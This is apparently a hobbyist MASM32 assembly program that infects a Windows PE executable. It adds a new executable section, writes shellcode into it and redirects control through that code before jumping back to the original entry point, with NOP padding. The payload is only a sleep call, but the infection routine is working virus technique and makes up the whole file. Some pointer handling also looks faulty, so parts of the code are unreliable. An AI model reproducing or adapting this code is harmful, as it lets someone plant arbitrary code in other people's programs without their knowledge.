.486
.model flat, stdcall
option casemap:none

include c:\masm32\include\windows.inc
include c:\masm32\include\kernel32.inc
include c:\masm32\include\user32.inc
include  c:\masm32\include\msvcrt.inc

includelib c:\masm32\lib\kernel32.lib
includelib c:\masm32\lib\user32.lib
includelib c:\masm32\lib\msvcrt.lib

.data

 ;shellcode sleep(4919)
shellcode 										db 33h, 192, 66h, 184,37h, 13h, 50h , 184, 42h, 24h, 80h, 7ch,  255, 208,  233,0 
patOnError 									db "Errorz", 13, 10, 0
patOnSuccess 									db "Success", 13, 10, 0
patSectionVirtualSize								db "Section->VirtualSize : ", 0
patNameOfFile									db "Polluting file: ", 0
patNewLine									db 13,10,0
patNumberOfSections								db "Number of sections: ", 0
patAddrNumberOfSections							db "Address of Number of Sections: ", 0
patAddrImageSectionHeader						db "Address of ImageSectionHeader: ", 0
patNewSectionVirtualAddr							db "New Section Virtual Address: ", 0
patSizeOfRawData								db "Size of Raw Data: ", 0

patPutPtr 										db "%p addr",13,10, 0
patPutInt 										db "%i deci",13,10, 0
patPutHexa									db "%x hexa", 13, 10, 0
patPutStr 										db "%s string",13,10, 0

filename 										db  "toto.exe", 0
sectionName 									db "NewSexy", 0
shellcodeNop									db "\x90", 0

.data?

;infosExecutable dd ? 
infosPE    										dd ?
tailleSection 									dd ?
executableHandle 								HANDLE ?
executableMap 									HANDLE ?
executableEnMemoire 							LPVOID ?
filePointer 										HANDLE ?

ptrEntryPoint  									dd ?
pointeurSizeOfImage 								dd ?
sectionAlignment 								dd ?
fileAlignment 									dd ?
sauvegardeEntryPoint 							dd ?
pointeurNombreDeSection 							dd ?
nombreDeSection 								dw ?
infosSection 									dw ?

pointerToRaw 									dd ?
decalage										dd ?
taille											dd ?
differenceDeTaille								dd ?

.code
start:

;long tailleSection = strlen(shellcode) + (sizeof(DWORD)); 
; taille du shellcode +  old entrypoint  
push	offset shellcode
call		crt_strlen
mov	tailleSection , eax
add		tailleSection, sizeof DWORD

push	offset filename
call		pollute

exit:
invoke	crt_printf,  offset patOnSuccess
invoke	ExitProcess, 0

exiterror:
call		GetLastError
invoke	crt_printf,  offset patOnError
invoke	crt_printf, offset patPutInt, eax
invoke	ExitProcess, 1

;seems to work one shot \o/, to verify
alignOn proc    alignment: DWORD, value: DWORD 
;invoke crt_printf, offset varPutInt, alignment
;invoke crt_printf, offset varPutInt, value
xor		 edx, edx
mov 	eax, value
div		alignment
cmp	edx, 0										;remainder of div is stocked in edx, result in eax
je		perfect										; if (!(value%alignment)) return value

inc		eax
mul		alignment 
jmp		bye 											; else return ((value/alignment) + 1) * (alignment)

perfect:
mov	eax, value
bye:
ret		8
alignOn	endp

pollute proc   filename1 : DWORD


invoke	crt_printf, offset patNameOfFile
invoke	crt_printf, filename1
invoke	crt_printf, offset patNewLine

; Opens file for both read and write                                                                                                                                                                   
mov	eax, GENERIC_WRITE
or            eax, GENERIC_READ
invoke     CreateFile,  filename1, eax, 0, 0, OPEN_EXISTING, 0, 0
mov	executableHandle, eax 
cmp	eax,  INVALID_HANDLE_VALUE
je		exiterror

invoke	CreateFileMapping,  executableHandle, 0, PAGE_READWRITE , 0  , 0 , 0
mov	executableMap, eax
cmp	eax,  INVALID_HANDLE_VALUE
je		exiterror
cmp	eax, NULL
je		exiterror

invoke	MapViewOfFile, executableMap, FILE_MAP_ALL_ACCESS , 0 , 0, 0
mov	executableEnMemoire, eax
cmp	eax, NULL
je		exiterror

mov	ebx, eax
assume	ebx: ptr IMAGE_DOS_HEADER
cmp	[ebx].e_magic, IMAGE_DOS_SIGNATURE
jne		exiterror

;infosPE = (PIMAGE_NT_HEADERS)((PUCHAR)infosExecutable + infosExecutable->e_lfanew);
; ebx += [ebx].e_lfanew
;; on pointe vers IMAGE_NT_HEADER
add		ebx, [ebx].e_lfanew
assume	ebx: ptr IMAGE_NT_HEADERS
cmp	[ebx].Signature,  IMAGE_NT_SIGNATURE
jne		exiterror

;PDWORD ptrEntryPoint = &infosPE->OptionalHeader.AddressOfEntryPoint;
; esi = OptionalHeader
lea		esi, [ebx].OptionalHeader
assume	esi :ptr IMAGE_OPTIONAL_HEADER
 
;PDWORD ptrEntryPoint = &infosPE->OptionalHeader.AddressOfEntryPoint;
mov	ptrEntryPoint, esi
add		ptrEntryPoint, 10h

;PDWORD pointeurSizeOfImage = &infosPE->OptionalHeader.SizeOfImage;
mov	pointeurSizeOfImage, esi
add		pointeurSizeOfImage, 38h

;DWORD sectionAlignment = infosPE->OptionalHeader.SectionAlignment;
mov	eax,  [esi].SectionAlignment
mov	sectionAlignment, eax

;DWORD fileAlignment = infosPE->OptionalHeader.FileAlignment;
mov	eax,  [esi].FileAlignment
mov	fileAlignment, eax

;DWORD sauvegardeEntryPoint = infosPE->OptionalHeader.AddressOfEntryPoint;
mov	eax,  [esi].AddressOfEntryPoint
mov	sauvegardeEntryPoint, eax

; edi = FileHeader
lea		edi, [ebx].FileHeader
assume	edi :ptr IMAGE_FILE_HEADER
invoke	crt_printf, offset patNumberOfSections
invoke	crt_printf, offset patPutInt,  [edi].NumberOfSections

;PWORD pointeurNombreDeSection = &infosPE->FileHeader.NumberOfSections;
mov	pointeurNombreDeSection, edi
add		pointeurNombreDeSection, 02h


;WORD nombreDeSection = &infosPE->FileHeader.NumberOfSections;
mov	ax, [edi].NumberOfSections
mov	nombreDeSection, ax


assume	ebx : nothing
invoke	crt_printf, offset patAddrNumberOfSections 

;push	ebx
;push	offset patPutPtr
;call		crt_printf

push	[ebx]
push	offset patPutPtr
call		crt_printf

;addr IMAGE_SECTION_HEADER  = addr IMAGE_NT_HEADERS + sizeof(IMAGE_NT_HEADERS)
;PIMAGE_SECTION_HEADER infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosPE + sizeof(IMAGE_NT_HEADERS));
invoke	crt_printf, offset patAddrImageSectionHeader
add		ebx, sizeof IMAGE_NT_HEADERS
push	ebx
push	offset patPutPtr
call		crt_printf

push	[ebx]
push	offset patPutPtr
call		crt_printf

;    infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection + ( (sizeof(IMAGE_SECTION_HEADER) ) * (infosPE->FileHeader.NumberOfSections) ) );
; ebx  pointe sur la fin des secitons headers
mov 	eax, sizeof IMAGE_SECTION_HEADER
mul 	nombreDeSection
add		ebx, eax

push 	eax
push 	offset patPutInt
call		crt_printf

push 	ebx
push 	offset patPutPtr
call		crt_printf


push 	[ebx]
push 	offset patPutPtr
call		crt_printf

; on peut  maintenant setter notre nouvelle section

;nbsections++
inc		[edi].NumberOfSections

;*pointeurSizeOfImage += tailleSection;
mov 	eax, pointeurSizeOfImage
mov 	ecx, tailleSection
add 	[eax], ecx
;printf new sizeOfImage;push [eax];push offset varPutInt;call crt_printf

;on set notre nouvelle section
assume	ebx: ptr IMAGE_SECTION_HEADER

;strcpy((char*)notreSection->Name,nomSection);
push 	offset sectionName
push	ebx 
call		crt_strcpy

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;a tester;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;notreSection->Misc.VirtualSize = AligneSur(sectionAlignment,tailleSection);
invoke	crt_printf, offset patPutInt, tailleSection
invoke	crt_printf, offset patPutInt, sectionAlignment

push	tailleSection
push 	sectionAlignment
call		alignOn
mov	 [ebx].Misc, eax
invoke	crt_printf, offset patSectionVirtualSize
invoke 	crt_printf, offset patPutHexa, [ebx].Misc


;   notreSection->VirtualAddress = AligneSur(sectionAlignment,(infosSection->VirtualAddress + infosSection->Misc.VirtualSize));
mov	ecx, ebx
sub		ecx, sizeof IMAGE_SECTION_HEADER
assume	ecx: ptr IMAGE_SECTION_HEADER
add		eax, [ecx].Misc
assume	ecx: nothing
push	ecx
push	sectionAlignment
call		alignOn
mov	[ebx].VirtualAddress, eax

invoke	crt_printf, offset patNewSectionVirtualAddr
invoke	crt_printf, offset patPutHexa, [ebx].VirtualAddress

;    notreSection->SizeOfRawData = AligneSur(fileAlignment,tailleSection);
push	tailleSection
push	fileAlignment
call		alignOn
mov 	[ebx].SizeOfRawData, eax 

invoke	crt_printf, offset patSizeOfRawData 
invoke	crt_printf, offset patPutHexa, [ebx].SizeOfRawData

;    notreSection->PointerToRawData = AligneSur(fileAlignment,(infosSection->SizeOfRawData + infosSection->PointerToRawData));
mov	ecx, ebx
sub		ecx, sizeof IMAGE_SECTION_HEADER
assume	ecx: ptr IMAGE_SECTION_HEADER
mov 	eax, [ecx].SizeOfRawData
add		eax, [ecx].PointerToRawData
assume	ecx:nothing
push	eax
push	fileAlignment
call		alignOn
mov 	[ebx].PointerToRawData, eax
;invoke	crt_printf, varPutPtr, [ebx].PointerToRawData

mov	[ebx].PointerToRelocations, 0
mov	[ebx].PointerToLinenumbers, 0
mov	[ebx].NumberOfRelocations, 0
mov	[ebx].NumberOfLinenumbers,  0


mov	eax, IMAGE_SCN_MEM_READ
add		eax, IMAGE_SCN_MEM_WRITE
add		eax, IMAGE_SCN_MEM_EXECUTE
mov	[ebx].Characteristics,  eax

   ; *ptrEntryPoint = notreSection->VirtualAddress;
mov	 eax, [ebx].Misc
mov	ptrEntryPoint, eax

;decalage = sauvegardeEntryPoint - ( (ptrEntryPoint + tailleSection) )
mov	eax, sauvegardeEntryPoint
sub		eax, ptrEntryPoint
sub		eax, tailleSection
mov	decalage, eax

; DWORD taille;
; long differenceDeTaille = (AligneSur(fileAlignment,tailleSection) - tailleSection);
push	tailleSection
push	fileAlignment
call		alignOn
sub		eax, tailleSection
mov	differenceDeTaille, eax

push	[ebx].PointerToRawData										;save PointerToRawData
invoke	UnmapViewOfFile,executableEnMemoire 
invoke	CloseHandle, executableHandle
invoke	CloseHandle, executableMap
invoke 	CreateFile, offset filename, GENERIC_WRITE ,  FILE_SHARE_WRITE , NULL , OPEN_ALWAYS , FILE_ATTRIBUTE_NORMAL , NULL
mov 	filePointer, eax													

pop		eax 													; restore PointerToRawData
;invoke	crt_printf, offset varPutPtr, eax
invoke	SetFilePointer, filePointer, eax, 0, FILE_BEGIN

; WriteFile, filePointer, offset shellcode, (strlen(shellcode) + 0), &taille, NULL				;writing the shellcode on pointerToRawData
push	0
push	offset taille
invoke	crt_strlen, offset shellcode	
push 	eax
push	offset shellcode
push	filePointer
call		WriteFile

;invoke    WriteFile, filePointer, &decallage, sizeof(DWORD), &taille, NULL							;writing jmp operand oldEntryPoint
push	0
push	offset taille
push	sizeof DWORD
push	offset decalage
push	filePointer
call		WriteFile

;fill the rest with nop in order to have the same size as we put in the header info
push	ecx
mov	ecx,	differenceDeTaille
myloop:
	push ecx
	invoke	WriteFile, filePointer, offset shellcodeNop, 1, offset taille, 0
	pop	ecx
loop	myloop
pop		ecx

invoke	CloseHandle, filePointer
ret
pollute endp



end start